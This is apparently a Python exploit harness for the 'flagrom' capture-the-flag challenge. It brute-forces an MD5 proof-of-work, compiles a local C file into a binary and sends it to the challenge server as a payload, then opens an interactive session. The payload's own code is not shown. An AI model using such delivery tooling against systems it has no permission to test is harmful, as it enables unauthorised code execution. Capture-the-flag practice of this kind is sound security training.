#!/usr/bin/env python3

import socket
import re
import hashlib
import random
import string
import os
from itertools import chain, product

HOST = "flagrom.ctfcompetition.com"
#HOST = "127.0.0.1"
PORT = 1337

def bruteforce(charset, maxlength):
	return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
        for i in range(1, maxlength + 1)))

def ru(s, a):
	d = b""

	while not d.endswith(a):
		c = s.recv(4096)
		d += c
		assert(c)
		print(repr(d))

	return d

def pow_connect():
	s = socket.socket()
	s.connect((HOST, PORT))

	chal_str = ru(s, b"?\n")

	chal_str = chal_str.decode("ASCII")

	r = re.search(r"What's a printable string less than 64 bytes that starts with flagrom- whose md5 starts with ([0-9a-z]{6})?", chal_str)

	md5_target = r.group(1)
	print(md5_target)

	def calc_pow(target):
		for test in(bruteforce(string.ascii_letters + string.digits, 64 - len("flagrom-"))):
			#print(test)
			response = "flagrom-" + test
			m = hashlib.md5()
			m.update(response.encode("ASCII"))
			if m.hexdigest().startswith(md5_target):
				return response.encode("ASCII")
			
	pow = calc_pow(md5_target)
	print("POW: ", pow)
	s.sendall(pow + b"\n")
	
	return s

os.makedirs("tmp", exist_ok=True)
os.chdir("tmp")
os.system("sdcc ../test.c")
os.system("objcopy -I ihex -O binary test.ihx test.bin")
usercode = open("test.bin", "rb").read()

s = pow_connect()
ru(s, b"What's the length of your payload?\n")

s.sendall(str(len(usercode)).encode("ASCII") + b"\n")
s.sendall(usercode + b"\n")

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
